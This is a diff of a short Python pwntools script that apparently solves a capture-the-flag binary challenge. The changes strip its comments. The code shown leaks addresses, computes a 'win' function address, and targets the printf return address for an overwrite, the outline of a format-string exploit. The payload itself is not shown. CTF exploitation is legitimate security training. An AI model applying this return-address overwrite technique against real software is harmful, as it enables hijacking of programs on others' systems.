@@ -9,7 +9,7 @@ def solve():
     else:
         p = process('./challenge')
 
-    # Pass 1: Leak
+
     p.recvuntil(b'> ')
     p.sendline(b'1')
     p.recvuntil(b'Transmit data: ')
@@ -26,14 +26,11 @@ def solve():
     win_addr = base_addr + 0x1320
     print(f"Win: {hex(win_addr)}")
     
-    # Target: printf return address
-    # buf is at rsp+0x10 (in main)
-    # printf ret is at rsp-0x8 (in main/printf call)
-    # diff = 0x18
+
     target_addr = buf_addr - 0x18
     print(f"Target: {hex(target_addr)}")
     
-    # Pass 2: Overwrite
+
     p.recvuntil(b'> ')
     p.sendline(b'1')
     p.recvuntil(b'Transmit data: ')
